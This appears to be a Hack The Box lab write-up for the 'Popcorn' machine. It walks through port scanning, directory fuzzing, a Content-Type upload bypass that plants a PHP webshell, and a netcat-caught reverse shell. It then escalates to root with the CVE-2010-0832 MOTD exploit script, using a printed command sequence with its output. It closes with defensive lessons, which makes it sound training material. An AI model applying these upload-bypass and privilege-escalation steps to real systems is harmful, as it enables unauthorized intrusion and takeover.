# Popcorn

![image.png](image.png)

# Context

Lab link: [https://app.hackthebox.com/machines/Popcorn](https://app.hackthebox.com/machines/Popcorn)

Suggested tools: `nmap`, `burp`, `chmod`, `searchsploit`

# Scenario

Popcorn, while not overly complicated, contains quite a bit of content and it can be difficult for some users to locate the proper attack vector at first. This machine mainly focuses on different methods of web exploitation.

# Questions

Q1- How many TCP ports are listening on Popcorn?

Answer: 2

Reason: A full TCP port scan with `nmap -sC -sV -p-` against `popcorn.htb` found only two open ports: `22/tcp` running `OpenSSH 5.1p1` on Debian/Ubuntu, and `80/tcp` running `Apache httpd 2.2.12`. No title was returned on the web root, and supported HTTP methods include `GET`, `HEAD`, `POST`, and `OPTIONS`.

```python
$ nmap -sC -sV -p- popcorn.htb -vv -oN popcorn_nmap.txt
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-05 14:24 -0500
[...]
Initiating SYN Stealth Scan at 14:24
Scanning popcorn.htb (10.129.123.135) [65535 ports]
Discovered open port 80/tcp on 10.129.123.135
Discovered open port 22/tcp on 10.129.123.135
[...]
Host is up, received echo-reply ttl 63 (0.098s latency).
Scanned at 2026-11-05 14:24:38 EST for 21s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAIAn8zzHM1eVS/OaLgV6dgOKaT+kyvjU0pMUqZJ3AgvyOrxHa2m+ydNk8cixF9lP3Z8gLwquTxJDuNJ05xnz9/DzZClqfNfiqrZRACYXsquSAab512kkl+X6CexJYcDVK4qyuXRSEgp4OFY956Aa3CCL7TfZxn+N57WrsBoTEb9PAAAAFQDMosEYukWOzwL00PlxxLC+lBadWQAAAIAhp9/JSROW1jeMX4hCS6Q/M8D1UJYyat9aXoHKg8612mSo/OH8Ht9ULA2vrt06lxoC3O8/1pVD8oztKdJgfQlWW5fLujQajJ+nGVrwGvCRkNjcI0Sfu5zKow+mOG4irtAmAXwPoO5IQJmP0WOgkr+3x8nWazHymoQlCUPBMlDPvgAAAIBmZAfIvcEQmRo8Ef1RaM8vW6FHXFtKFKFWkSJ42XTl3opaSsLaJrgvpimA+wc4bZbrFc4YGsPc+kZbvXN3iPUvQqEldak3yUZRRL3hkF3g3iWjmkpMG/fxNgyJhyDy5tkNRthJWWZoSzxS7sJyPCn6HzYvZ+lKxPNODL+TROLkmQ==
|   2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyBXr3xI9cjrxMH2+DB7lZ6ctfgrek3xenkLLv2vJhQQpQ2ZfBrvkXLsSjQHHwgEbNyNUL+M1OmPFaUPTKiPVP9co0DEzq0RAC+/T4shxnYmxtACC0hqRVQ1HpE4AVjSagfFAmqUvyvSdbGvOeX7WC00SZWPgavL6pVq0qdRm3H22zIVw/Ty9SKxXGmN0qOBq6Lqs2FG8A14fJS9F8GcN9Q7CVGuSIO+UUH53KDOI+vzZqrFbvfz5dwClD19ybduWo95sdUUq/ECtoZ3zuFb6ROI5JJGNWFb6NqfTxAM43+ffZfY28AjB1QntYkezb1Bs04k8FYxb5H7JwhWewoe8xQ==
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.2.12
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.12 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Q2- What is the relative path on the webserver to a file sharing service?

Answer: `/torrent`

Reason: Directory fuzzing against `http://popcorn.htb/` with `ffuf` and the `raft-small-directories.txt` wordlist revealed `/torrent` (301) alongside `/test` and `/rename`. The `/torrent` path points to a file sharing/torrent management service hosted on the box.

```python
$ ffuf -u http://popcorn.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -c -fc 403,404 -t 40 

 :: Method           : GET
 :: URL              : http://popcorn.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403,404
________________________________________________

index                   [Status: 200, Size: 177, Words: 22, Lines: 5, Duration: 47ms]
test                    [Status: 200, Size: 47394, Words: 2478, Lines: 655, Duration: 5018ms]
torrent                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 33ms]
rename                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 29ms]
```

![image.png](image%201.png)

Q3- What HTTP request header is being used to filter uploaded content?

Answer: `Content-Type`

Reason: Uploading a plain text file through the `/torrent/torrents.php?mode=upload` form and intercepting the request in Burp showed the file part carrying `Content-Type: text/plain`, and the server rejected it with "This is not a valid torrent file." This indicates the backend validates the uploaded file based on the multipart `Content-Type` header value rather than checking the actual file content, meaning it can likely be bypassed by spoofing that header to a value the server accepts (e.g. `application/x-bittorrent`) while uploading arbitrary content such as a PHP webshell.

```python
# Burp upload function on /torrent, after simple registration of test user

POST /torrent/torrents.php?mode=upload HTTP/1.1
Host: popcorn.htb
Content-Length: 4740
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryiD0E6rVliGvtdIjb
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: http://popcorn.htb
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://popcorn.htb/torrent/torrents.php?mode=upload
Accept-Encoding: gzip, deflate, br
Cookie: /torrent/=; saveit_0=4; saveit_1=0; PHPSESSID=7eea0ff6f0049be77858f7d210dd81c0
Connection: keep-alive

------WebKitFormBoundaryiD0E6rVliGvtdIjb
Content-Disposition: form-data; name="torrent"; filename="nmap_initial.txt"
Content-Type: text/plain

[...]

------WebKitFormBoundaryiD0E6rVliGvtdIjb
Content-Disposition: form-data; name="filename"

test
------WebKitFormBoundaryiD0E6rVliGvtdIjb
Content-Disposition: form-data; name="type"

3
------WebKitFormBoundaryiD0E6rVliGvtdIjb
Content-Disposition: form-data; name="subtype"

19
------WebKitFormBoundaryiD0E6rVliGvtdIjb
Content-Disposition: form-data; name="user_id"

------WebKitFormBoundaryiD0E6rVliGvtdIjb
Content-Disposition: form-data; name="anonymous2"

false
------WebKitFormBoundaryiD0E6rVliGvtdIjb
Content-Disposition: form-data; name="anonymous"

true
------WebKitFormBoundaryiD0E6rVliGvtdIjb
Content-Disposition: form-data; name="autoset"

enabled
------WebKitFormBoundaryiD0E6rVliGvtdIjb
Content-Disposition: form-data; name="info"

------WebKitFormBoundaryiD0E6rVliGvtdIjb
Content-Disposition: form-data; name="registration"

false
------WebKitFormBoundaryiD0E6rVliGvtdIjb
Content-Disposition: form-data; name="hideuser"

false
------WebKitFormBoundaryiD0E6rVliGvtdIjb
Content-Disposition: form-data; name="submit"

Upload Torrent
------WebKitFormBoundaryiD0E6rVliGvtdIjb--
```

Q4- What user is the webserver running as?

Answer: `www-data`

Reason: The screenshot upload field under `torrent/upload_file.php?mode=upload` on `popcorn.htb` only validated the multipart `Content-Type` header, not the real file content or extension, so a file named `shell.php` was accepted while spoofing `Content-Type: image/png`. Browsing to the saved shell triggered a reverse shell connection, confirming the web server process runs as the low-privilege `www-data` user.

```python

$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.7] from (UNKNOWN) [10.129.123.135] 44173
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
 23:20:18 up  1:57,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 

```

![image.png](image%202.png)

![image.png](image%203.png)

Q5- User flag

Answer: [REDACTED]

Reason: The upload path through `/torrent/upload_file.php` (via the screenshot Content-Type bypass) gave a reverse shell as `www-data`. From there, `/home/george/user.txt` was found to be readable directly by `www-data`, allowing the user flag to be captured without needing to fully pivot to the `george` account.

```python
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ls /home
george
$ ls /home/george/
torrenthoster.zip  user.txt
$ ls /home/george/user.txt 
/home/george/user.txt
$ cat /home/george/user.txt 
```

Q6- What is the 2010 CVE ID for a privilege escalation vulnerability in Linux PAM having to do with the message of the day?

Answer: CVE-2010-0832

Reason: `popcorn.htb` runs an old Ubuntu kernel/userland (`Linux popcorn 2.6.31-14-generic-pae`) consistent with the 2010-era `update-motd`/`pam_motd` local privilege escalation. `CVE-2010-0832` affects Ubuntu's dynamically generated message-of-the-day script, which runs with root privileges on login and can be abused via a race condition/symlink attack on the `/etc/update-motd.d/` scripts to achieve root.

Q7- Root flag

Answer: [REDACTED]

Reason: The `CVE-2010-0832` PAM/MOTD privilege escalation exploit (`14339.sh`, found via `searchsploit 14339`) was used to escalate from `www-data` to `root`. The script first failed silently, falling back to an SSH password prompt instead of completing, because it writes a temporary SSH keypair into `/var/www/.ssh/authorized_keys` for key-based login, and `/var/www/.ssh` was world-writable (`drwxrwxrwx`), which caused `sshd`'s `StrictModes yes` setting to reject the key and demand a password it didn't have. Fixing the permissions on `/var/www/.ssh` (`chmod 700`) and `authorized_keys` (`chmod 600`) satisfied `StrictModes`, allowing the script's self-generated key to authenticate over SSH as intended, which then exercised the vulnerable `update-motd` root-privileged MOTD generation to tamper with `/etc/passwd` and `/etc/shadow` and drop into a root shell.

```python
$ searchsploit 14339       
---------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                            |  Path
---------------------------------------------------------------------------------------------------------- ---------------------------------
Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)                        | linux/local/14339.sh
---------------------------------------------------------------------------------------------------------- ---------------------------------

$ chmod 700 /var/www/.ssh
$ chmod 600 /var/www/.ssh/authorized_keys
$ ./14339.sh
[+] owned: /etc/passwd
[+] owned: /etc/shadow
[+] Success! Use password toor to get root
Password:
root@popcorn:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

# Artifacts

| Category | Type | Value |
| --- | --- | --- |
| Target | Hostname | `popcorn.htb` |
|  | OS/Kernel | Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP |
| Discovery | Open ports | 22/tcp (OpenSSH 5.1p1), 80/tcp (Apache 2.2.12) |
|  | Hidden paths | `/torrent`, `/test`, `/rename` |
|  | Info leak | phpinfo() via `/test` (PHP 5.2.10, MySQL enabled, www-data, `/var/www`) |
| Credential Access | Registered account | test : pass123 on Torrent Hoster |
| Initial Access | Vulnerability | Content-Type header-only validation on file upload (torrents.php?mode=upload and screenshot upload upload_file.php?mode=upload) |
|  | Payload | shell.php uploaded with spoofed Content-Type: image/png via "Update Screenshot" field |
|  | Shell | Reverse shell as www-data (uid 33) |
| Discovery | User flag location | `/home/george/user.txt` (readable by www-data) |
| Privilege Escalation | CVE | CVE-2010-0832 (Linux PAM / update-motd MOTD tampering) |
|  | Exploit | [14339.sh](http://14339.sh/) (Exploit-DB) |
|  | Blocker | `/var/www/.ssh` world-writable (777), tripped StrictModes yes in sshd_config |
|  | Fix | chmod 700 `/var/www/.ssh`, chmod 600 authorized_keys |
|  | Result | Root shell, password toor |
| Flags | User flag | [REDACTED] |
|  | Root flag | [REDACTED] |

# Lab Insights

1. Validating file uploads by trusting the client-supplied `Content-Type` header (or extension alone) is equivalent to not validating file type at all, since both are attacker-controlled values in the request, not properties of the file's actual content. On `popcorn.htb`, two separate upload endpoints (the torrent upload and the screenshot upload) both made this mistake, and the less-scrutinized "secondary" feature (screenshot upload) turned out to be the actual exploitable one — a reminder that defenders often harden the obvious primary input while overlooking adjacent features that touch the same filesystem. (`T1190`)
2. A patched or broken "intended" exploit is rarely a true dead end — it's often a misconfiguration one layer removed from the vulnerability itself. The PAM MOTD exploit initially failed not because the underlying `CVE-2010-0832` logic was patched, but because an incidental permission state (`/var/www/.ssh` left world-writable) tripped an unrelated SSH hardening control (`StrictModes`). Recognizing that the symptom (password prompt instead of silent key auth) pointed to a permissions problem, not an exploit problem, was the difference between abandoning the technique and completing it. (`T1068`)
3. World-writable directories and files are a persistent privilege-escalation smell, even when they don't look obviously exploitable at first glance. `/var/www/.ssh` being `777` wasn't itself the vulnerability, but it silently broke a security control (SSH's strict permission checking) that was otherwise protecting the box, illustrating how permission misconfigurations can disable defenses as easily as they can enable attacks. (`T1222`)